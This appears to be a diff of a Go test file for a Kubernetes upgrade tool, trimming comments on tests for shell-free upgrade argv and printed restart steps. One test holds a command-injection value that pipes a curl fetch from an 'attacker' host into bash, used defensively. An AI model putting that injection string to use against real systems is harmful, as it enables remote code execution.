@@ -8,10 +8,7 @@ import (
 	"github.com/ctrliq/stratum/internal/rollout"
 )
 
-// TestNodeUpgradeArgvHasNoShell is the structural guarantee: no
-// interpreter is present anywhere in the payload, so nothing in it can be
-// re-parsed as code. A regression here re-opens the injection channel even if
-// every validator upstream still passes.
+// No interpreter may appear anywhere in the payload: nothing in it can be re-parsed as code.
 func TestNodeUpgradeArgvHasNoShell(t *testing.T) {
 	argv := nodeUpgradeArgv(ClusterOptions{
 		From: "/var/lib/stratum-upgrade/stratum-v1.36.2", Target: "v1.36.2", SoakSec: 15,
@@ -31,9 +28,7 @@ func TestNodeUpgradeArgvHasNoShell(t *testing.T) {
 	}
 }
 
-// Hostile values must land as ONE argv element each and never be split,
-// concatenated, or interpreted. Preflight rejects these upstream; this asserts
-// the payload layer is safe on its own, so the two controls are independent.
+// Hostile values must land as one argv element each; preflight is a separate control.
 func TestNodeUpgradeArgvKeepsHostileValuesAsSingleElements(t *testing.T) {
 	const evil = "v1.36.2; curl http://attacker/x | bash"
 	argv := nodeUpgradeArgv(ClusterOptions{From: "/b", Target: evil, SoakSec: 15}, Node{})
@@ -65,23 +60,12 @@ func TestNodeUpgradeArgvSkipSnapshot(t *testing.T) {
 	}
 }
 
-// The steps a cluster upgrade prints after the complete line must name the
-// restart of Stratum's own DaemonSets, the same command for the operator's
-// own, the pod-by-pod delete for an OnDelete DaemonSet, a wait for each
-// rollout, and a reboot of each control plane, one at a time, that recreates
-// the static pods no restart reaches: gated on every etcd member healthy
-// before the first, on the rebooted node's etcd and own apiserver after each,
-// and with the uncordon that follows its drain. Every command
-// runs the installed binary under sudo by its quoted absolute path: the admin
-// kubeconfig is root-only, and sudo on Rocky does not search /usr/local/bin.
 func TestConfinementRestartSteps(t *testing.T) {
 	for _, path := range []string{"/usr/local/bin/stratum", "/opt/my stratum/stratum"} {
 		q := shellQuote(path)
 		kubectl := "sudo " + q + " kubectl"
 		steps := confinementRestartSteps(path)
 		lines := strings.Split(steps, "\n")
-		// Every workload the restore restarts, and cilium-envoy, gets its own
-		// restart and status line, as printed.
 		want := append(rollout.RestartCommands(kubectl), kubectl+" -n kube-system rollout restart ds/cilium-envoy")
 		for _, wl := range rollout.Workloads {
 			for _, target := range wl.Targets {
@@ -95,8 +79,6 @@ func TestConfinementRestartSteps(t *testing.T) {
 			}
 		}
 		etcdctl := "sudo " + q + " etcdctl"
-		// Every etcd member is checked healthy before the first reboot, and the
-		// rebooted node's etcd and own apiserver after each, as whole lines.
 		before := "On a control-plane node, every member must report healthy:\n\n  " + etcdctl + " endpoint health --cluster\n\nThen, on each control-plane node, one at a time: "
 		after := "On that node, run both of these until every etcd member reports healthy and its own apiserver answers ok:\n\n" +
 			"  " + etcdctl + " endpoint health --cluster\n" +
@@ -110,9 +92,7 @@ func TestConfinementRestartSteps(t *testing.T) {
 			kubectl + " -n <namespace> rollout status ds/<name>",
 			"start only when every control-plane node is upgraded and Ready and every etcd member is healthy (recover a control plane this upgrade halted on first).",
 			before,
-			// The drain bypasses the upgrade's CoreDNS gate, so the steps give
-			// its rule: a serving replica elsewhere first, and the outage a
-			// single node cannot avoid.
+			// The drain bypasses the CoreDNS gate, so the steps state its rule by hand.
 			"one at a time: before you drain it, see where CoreDNS runs (" + kubectl + " -n kube-system get pods -l k8s-app=kube-dns -o wide). " +
 				"CoreDNS has no PodDisruptionBudget, so a drain evicts every replica on the node. " +
 				"If the node runs one, drain it only once another replica, not Terminating, is Running and Ready on another node that is Ready (" + kubectl + " get nodes); " +
